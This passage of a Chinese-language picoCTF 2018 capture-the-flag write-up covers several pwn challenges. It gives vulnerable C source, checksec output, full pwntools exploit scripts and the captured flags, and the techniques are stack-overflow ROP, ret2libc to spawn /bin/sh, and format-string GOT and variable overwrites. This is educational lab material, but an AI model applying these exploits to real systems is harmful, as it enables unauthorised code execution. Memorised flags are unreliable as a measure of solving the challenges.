      fgets(buf,FLAGSIZE,f);
      if (arg1 != 0xDEADBEEF)
        return;
      if (arg2 != 0xDEADC0DE)
        return;
      printf(buf);
    }
    void vuln(){
      char buf[BUFSIZE];
      gets(buf);
      puts(buf);
    }
    int main(int argc, char **argv){
      setvbuf(stdout, NULL, _IONBF, 0);
      gid_t gid = getegid();
      setresgid(gid, gid, gid);
      puts("Please enter your string: ");
      vuln();
      return 0;
    }
我们很容易理解题目是要我们通过vuln函数里的栈溢出把执行流劫持到win函数，并且要使传入的参数为0xDEADBEEF和0xDEADC0DE，由于是32位程序，所以直接p32(0xDEADBEEF)+p32(0xDEADC0DE)构造ROP来getflag
EXP
    from pwn import*
    context(os='linux',arch='i386',log_level='debug')
    n = process('./vuln')
    elf = ELF('./vuln')
    buf = 'a'*0x6c
    win_addr = 0x80485CB
    payload = buf + 'aaaa' + p32(win_addr)+ 'aaaa' + p32(0xDEADBEEF) + p32(0xDEADC0DE)
    n.sendline(payload)
    n.interactive()
FLAG
    picoCTF{addr3ss3s_ar3_3asy30833fa1}
###  got-2-learn-libc
    ➜  got-2-learn-libc file vuln 
    vuln: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4e901d4c8bdb0ea8cfd51522376bea63082a2734, not stripped
    ➜  got-2-learn-libc checksec vuln 
    [*] '/home/Ep3ius/pwn/process/picoCTF2018/got-2-learn-libc/vuln'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      PIE enabled
开了PIE，然而看到程序觉得开没开都没差的样子
    #include 
    #include 
    #include 
    #include 
    #include 
    #define BUFSIZE 148
    #define FLAGSIZE 128
    char useful_string[16] = "/bin/sh"; /* Maybe this can be used to spawn a shell? */
    void vuln(){
      char buf[BUFSIZE];
      puts("Enter a string:");
      gets(buf);
      puts(buf);
      puts("Thanks! Exiting now...");
    }
    int main(int argc, char **argv){
      setvbuf(stdout, NULL, _IONBF, 0);
      // Set the gid to the effective gid
      // this prevents /bin/sh from dropping the privileges
      gid_t gid = getegid();
      setresgid(gid, gid, gid);
      puts("Here are some useful addresses:n");
      printf("puts: %pn", puts);
      printf("fflush %pn", fflush);
      printf("read: %pn", read);
      printf("write: %pn", write);
      printf("useful_string: %pn", useful_string);
      printf("n");
      vuln();
      return 0;
    }
是的，就是一个简单的ret2libc的应用，通过printf出的地址我们可以得到偏移量，然后去计算system的实际地址，然后把useful_string输出的地址，也就是”/bin/sh”当作参数来构造ROP来执行system(‘/bin/sh’)
我们先连上题目环境看下文件链接的libc文件的路径
    Ep3ius@pico-2018-shell-2:/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833$ ldd *
    vuln:
        linux-gate.so.1 =>  (0xf77c5000)
        libc.so.6 => /lib32/libc.so.6 (0xf75ff000)
        /lib/ld-linux.so.2 (0xf77c6000)
EXP
    from pwn import*
    context(os='linux',arch='i386',log_level='debug')
    n = process('./vuln')
    elf = ELF('./vuln')
    libc = ELF('/lib32/libc.so.6')
    buf = 'a'*0x9c
    system_sym = libc.symbols['system']
    puts_sym = libc.symbols['puts']
    n.recvuntil('puts: 0x')
    puts_addr = int(n.recvuntil('n'),16)
    print hex(puts_addr)
    n.recvuntil('useful_string: ')
    sh_addr = int(n.recvuntil('n'),16)
    print hex(sh_addr)
    system_addr = (puts_addr - puts_sym) + system_sym
    payload = buf + 'aaaa' + p32(system_addr) + 'aaaa' + p32(sh_addr)
    n.sendline(payload)
    n.interactive()
###  echooo
    ➜  echooo file echo 
    echo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a5f76d1d59c0d562ca051cb171db19b5f0bd8fe7, not stripped
    ➜  echooo checksec echo 
    [*] '/home/Ep3ius/pwn/process/picoCTF2018/echooo/echo'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    #include 
    #include 
    #include 
    #include 
    #include 
    int main(int argc, char **argv){
      setvbuf(stdout, NULL, _IONBF, 0);
      char buf[64];
      char flag[64];
      char *flag_ptr = flag;
      // Set the gid to the effective gid
      gid_t gid = getegid();
      setresgid(gid, gid, gid);
      memset(buf, 0, sizeof(flag));
      memset(buf, 0, sizeof(buf));
      puts("Time to learn about Format Strings!");
      puts("We will evaluate any format string you give us with printf().");
      puts("See if you can get the flag!");
      FILE *file = fopen("flag.txt", "r");
      if (file == NULL) {
        printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.n");
        exit(0);
      }
      fgets(flag, sizeof(flag), file);
      while(1) 
      {
        printf("> ");
        fgets(buf, sizeof(buf), stdin);
        printf(buf);
      }  
      return 0;
    }
审计完源码后发现在main函数末尾存在可多次利用的格式化字符串漏洞，而flag已经读入到栈上本来的解题思路应该是通过格式化字符串读栈上flag所在的位置来获得flag，但我的第一想法是直接改printf_got为system的实际地址拿shell
先测出来偏移为11
    ➜  echooo ./echo
    Time to learn about Format Strings!
    We will evaluate any format string you give us with printf().
    See if you can get the flag!
    > aaaa%11$x
    aaaa61616161
然后通过p32(printf_got)+”%11$s”泄露出printf的实际地址来计算偏移以此得到system的实际地址
EXP
    from pwn import*
    context(os='linux',arch='i386',log_level='debug')
    #n = process('./echo')
    n = remote('2018shell2.picoctf.com',57169)
    elf = ELF('./echo')
    libc = ELF('/lib32/libc.so.6')
    #printf_got = elf.got['printf']
    printf_got = 0x804a00c
    printf_sym = libc.symbols['printf']
    system_sym = libc.symbols['system']
    payload = p32(printf_got)+'%11$s'
    n.recvuntil('>')
    n.sendline(payload)
    #leak
    printf_addr1 = n.recvuntil('n')
    printf_addr = u32(printf_addr1[5:9])
    print hex(printf_addr)
    offset = printf_addr - printf_sym
    system_addr = offset + system_sym
    print hex(system_addr)
    payload_fmt = fmtstr_payload(11,{printf_got:system_addr})
    n.recvuntil('>')
    n.sendline(payload_fmt)
    sleep(0.1)
    n.sendline('/bin/sh')
    n.interactive()
FLAG
    picoCTF{foRm4t_stRinGs_aRe_DanGer0us_e3d226b2}
###  authenticate
    ➜  authenticate file auth 
    auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=36db9dbaf46e8f9c9055839ffedd30fe65050a47, not stripped
    ➜  authenticate checksec auth 
    [*] '/home/Ep3ius/pwn/process/picoCTF2018/authenticate/auth'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
审计下源码
    #include 
    #include 
    #include 
    #include 
    #include 
    int authenticated = 0;
    int flag() {
      char flag[48];
      FILE *file;
      file = fopen("flag.txt", "r");
      if (file == NULL) {
        printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.n");
        exit(0);
      }
      fgets(flag, sizeof(flag), file);
      printf("%s", flag);
      return 0;
    }
    void read_flag() {
      if (!authenticated) {
        printf("Sorry, you are not *authenticated*!n");
      }
      else {
        printf("Access Granted.n");
        flag();
      }
    }
    int main(int argc, char **argv) {
      setvbuf(stdout, NULL, _IONBF, 0);
      char buf[64];
      // Set the gid to the effective gid
      // this prevents /bin/sh from dropping the privileges
      gid_t gid = getegid();
      setresgid(gid, gid, gid);
      printf("Would you like to read the flag? (yes/no)n");
      fgets(buf, sizeof(buf), stdin);
      if (strstr(buf, "no") != NULL) {
        printf("Okay, Exiting...n");
        exit(1);
      }
      else if (strstr(buf, "yes") == NULL) {
        puts("Received Unknown Input:n");
        printf(buf);
      }
      read_flag();
    }
简单的过一遍我们可以得到程序的大致流程，如果输入的字符串内带有”no”就退出程序，如果输入的字符串带有”yes”且没有”no”便进入unknown_input分支并触发了一个格式化字符串漏洞，然后程序继续执行进入read_flag()函数里，先进行一个判断，如果authenticated不为0就能调用flag函数来getflag，而authenticated是在一开始就全局定义为0了，这时我们能想到通过利用前面的格式化字符串来修改authenticated的值
EXP
    from pwn import*
    context(os='linux',arch='i386',log_level='debug')
    #n = process('./auth')
    n = remote('2018shell2.picoctf.com',52398)
    elf = ELF('./auth')
    puts_got = elf.got['puts']
    puts_sym = elf.symbols['puts']
    authenticated_addr = 0x0804A04C
    payload = fmtstr_payload(11,{authenticated_addr:0xDEADBEEF})
    n.sendline(payload)
    n.interactive()
FLAG
    picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_0bec1698}
###  got—shell?
    ➜  got-shell file auth 
    auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5c1f84b034b4906cce036c3748d4b5a5c3eae0d8, not stripped
    ➜  got-shell checksec auth 
    [*] '/home/Ep3ius/pwn/process/picoCTF2018/got-shell/auth'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
看一波源码
    #include 
    #include 
    #include 
    #include 
    #include 
    void win() {
      system("/bin/sh");